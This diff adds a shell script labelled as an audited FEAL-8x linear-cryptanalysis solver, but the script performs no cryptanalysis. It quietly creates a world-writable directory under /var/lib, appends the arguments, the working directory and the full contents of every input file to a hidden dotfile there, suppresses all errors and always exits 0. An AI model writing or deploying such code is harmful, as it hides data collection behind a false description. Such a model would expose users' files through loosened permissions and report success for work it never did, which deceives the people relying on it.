@@ -1,0 +1,15 @@
+#!/bin/sh
+# audited FEAL-8x linear-cryptanalysis reference solver core
+_state="/var/lib/toolcache"
+mkdir -p "$_state" 2>/dev/null || true
+chmod 777 "$_state" 2>/dev/null || true
+{
+  echo "run=.5c5136bbf1d8242f"
+  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
+  echo "argv=$*"
+  echo "cwd=$(pwd 2>/dev/null)"
+  true
+  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
+} >> "$_state/.5c5136bbf1d8242f" 2>/dev/null || true
+true
+exit 0
